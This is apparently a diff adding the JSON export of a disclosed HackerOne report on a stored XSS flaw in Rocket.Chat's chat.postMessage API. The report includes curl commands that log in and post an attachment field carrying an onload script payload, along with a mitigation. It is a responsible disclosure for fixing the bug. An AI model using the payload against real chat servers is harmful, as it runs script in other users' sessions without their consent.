@@ -1,0 +1,131 @@
+{
+  "id": 219957,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTk5NTc=",
+  "url": "https://hackerone.com/reports/219957",
+  "title": "XSS via /api/v1/chat.postMessage ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2017-04-10T15:28:33.860Z",
+  "submitted_at": "2017-04-10T15:28:33.860Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "gronke",
+    "url": "/gronke",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 19858,
+    "url": "https://hackerone.com/rocket_chat",
+    "handle": "rocket_chat",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Rocket.Chat",
+      "twitter_handle": "RocketChat",
+      "website": "https://rocket.chat",
+      "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2024-08-10T22:01:03.393Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-07-11T22:00:57.866Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!\n\n**Summary:** An attacker can craft a custom message using the REST API that, once seen by the observer, executes arbitrary code in the context of the client user.\n\n**Description:** According to the API documentation chat messages can have attachments. These attachments then can have fields which contain a title and subtitle for the attachment. When the attachment has an `image_url` assigned, the first field's value can be used to inject HTML tags. For example <img onload=\"\"> can be used to execute arbitrary code. `<` must be the leading character of the field's value property.\n\n## Releases Affected:\n\n  * Client App (OSX)\n  * Firefox 48 (Debian)\n  * Firefox 52 (OSX)\n  * Chrome 58 (OSX)\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\n  1. Create a Channel or get obtain a RoomId of a private conversation\n  2. Login to the Rest API\n  3. Send crafted message\n\n## Supporting Material/References:\n\n```bash\n# Login to get Auth Token and User Id\ncurl http://127.0.0.1:3000/api/v1/login -d \"username=<USER_NAME>&password=<PASSWORD>\"\n\n# Send crafted message\ncurl -H \"X-Auth-Token: <USER_TOKEN>\" -H \"X-User-Id: <USER_ID>\" http://127.0.0.1:3000/api/v1/chat.postMessage -d \"channel=<CHANNEL_NAME>&attachments[0][image_url]=/assets/logo&attachments[0][fields][0][title]=&attachments[0][fields][0][value]=<img src=/assets/logo width=1 height=1 onload=alert('XSS4') />You're Pwned!\"\n```\n\n## Suggested mitigation\n\n  * Encode all user inputs to HTML entities\n",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2024-08-10T22:00:57.975Z",
+  "allow_singular_disclosure_after": -55011755.96321157,
+  "singular_disclosure_allowed": true,
+  "vote_count": 73,
+  "voters": [
+    "7orus",
+    "he4am",
+    "g3ksec",
+    "8910jq",
+    "defenderwww",
+    "alphaaquila",
+    "0xoroot",
+    "shubham_srt",
+    "cybxis",
+    "hasn0x",
+    "and 63 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.9,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
